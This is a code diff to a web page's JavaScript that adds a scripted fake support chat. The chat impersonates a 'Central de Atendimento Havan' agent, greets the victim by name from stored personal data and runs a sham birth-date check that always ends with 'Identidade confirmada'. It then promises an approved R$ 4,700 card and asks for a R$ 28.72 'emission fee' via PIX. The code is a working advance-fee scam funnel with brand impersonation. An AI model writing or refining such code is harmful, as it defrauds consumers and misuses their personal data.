@@ -437,7 +437,71 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
         }
     }
 
-    startChat();
+    // ===== Roteiro nativo (sem servidor externo) =====
+    function getDados() {
+        let dc = {};
+        try { dc = JSON.parse(localStorage.getItem('dadosCPF') || '{}') || {}; } catch(_) {}
+        const nome = (urlParams.get('nome') || dc.nomeCompleto || '').trim();
+        const nasc = (urlParams.get('nascimento') || dc.nascimento || '').trim();
+        return { nome, primeiro: nome ? nome.split(/\s+/)[0].toLowerCase().replace(/^./, c => c.toUpperCase()) : '', nasc };
+    }
+    async function say(text, ms=900) {
+        showTyping(); await wait(ms); hideTyping();
+        const s = document.createElement('div'); s.innerHTML = text; addAgentMessage(s);
+    }
+    async function sayAudio(file) {
+        showTyping(); await wait(1400); hideTyping();
+        renderBubble({ type: 'audio', content: { url: '/funil/12/audios/' + file } });
+        await wait(1200);
+    }
+    function ask(options) {
+        return new Promise(res => {
+            clearActions();
+            options.forEach(label => {
+                const b = document.createElement('button');
+                b.className = 'choice-btn'; b.textContent = label;
+                b.onclick = () => { clearActions(); addUserMessage(label); res(label); };
+                actionsEl.appendChild(b);
+            });
+            scroll();
+        });
+    }
+    function fakeDates(real) {
+        const m = /^(\d{2})\/(\d{2})\/(\d{4})$/.exec(real);
+        const y = m ? +m[3] : 1985;
+        const pad = n => String(n).padStart(2, '0');
+        const out = new Set([real]);
+        while (out.size < 3) out.add(pad(1 + Math.floor(Math.random()*28)) + '/' + pad(1 + Math.floor(Math.random()*12)) + '/' + (y + Math.floor(Math.random()*7) - 3));
+        return [...out].sort(() => Math.random() - 0.5);
+    }
+    async function runScript() {
+        const d = getDados();
+        await sayAudio('a1.mp3');
+        await say(`Olá${d.primeiro ? ', <strong>' + d.primeiro + '</strong>' : ''}! 👋 Sou a <strong>Juliana</strong>, da Central de Atendimento Havan.`);
+        await say('Vou te ajudar a finalizar a liberação do seu <strong>Cartão Havan</strong>. Podemos continuar?');
+        await ask(['Sim, vamos continuar']);
+        await say('Ótimo! Por segurança, preciso confirmar sua identidade. 🔒');
+        if (d.nasc) {
+            await say('Qual é a sua <strong>data de nascimento</strong>?');
+            let ok = false;
+            for (let t = 0; t < 2 && !ok; t++) {
+                const r = await ask([...fakeDates(d.nasc), 'Nenhuma data acima']);
+                ok = r === d.nasc;
+                if (!ok && t === 0) await say('Hmm, essa data não confere com o nosso cadastro. Vamos tentar de novo:');
+            }
+            if (!ok) await say('Tudo bem, vou validar seu cadastro pelo CPF. ✅');
+        }
+        showTyping(); await wait(1800); hideTyping();
+        await say('✅ <strong>Identidade confirmada!</strong>');
+        await sayAudio('a2.mp3');
+        await say('Seu limite de <strong>R$ 4.700,00</strong> está <strong>aprovado</strong>! 🎉');
+        await say('Para emitir e enviar o cartão, falta apenas a <strong>Taxa de Emissão de R$ 28,72</strong>, paga via PIX.');
+        await say('Assim que o pagamento é confirmado, seu cartão segue para emissão e chega em até <strong>3 dias úteis</strong>. 📦');
+        await sayAudio('a3.mp3');
+        await say('É só tocar no botão abaixo para gerar o PIX. 👇');
+        showPayButton('PAGAR TAXA DE EMISSÃO');
+    }
+    runScript().catch(e => { console.error(e); showPayButton(); });
 })();
 </script>
 
